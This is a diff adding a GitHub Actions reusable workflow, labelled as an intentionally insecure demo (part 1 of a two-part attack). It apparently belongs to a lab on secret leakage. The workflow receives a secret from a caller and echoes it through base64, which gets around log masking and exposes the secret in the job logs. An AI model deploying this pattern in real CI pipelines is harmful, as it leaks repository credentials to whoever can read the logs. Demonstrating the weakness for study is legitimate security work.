@@ -1,0 +1,19 @@
+# ATTACK 3, PART 1 OF 2 (insecure on purpose). This file belongs in the
+# ATTACKER's repository (GithubActionsSecretAttackerWorkflows), at
+# .github/workflows/leak.yml, NOT in this service repository. It is shown here
+# only for reference. It is a reusable workflow (on: workflow_call) that receives
+# a secret named "target" and prints its base64. The caller (part 2 of 2) passes
+# DEMO_SECRET to it by name; secrets: inherit is NOT used because it only works
+# when the called workflow is in the same organization, whereas passing the
+# secret by name works across accounts. Rename to remove .insecure to run it.
+name: leak
+on:
+  workflow_call:
+    secrets:
+      target:
+        required: true
+jobs:
+  leak:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: echo "${{ secrets.target }}" | base64
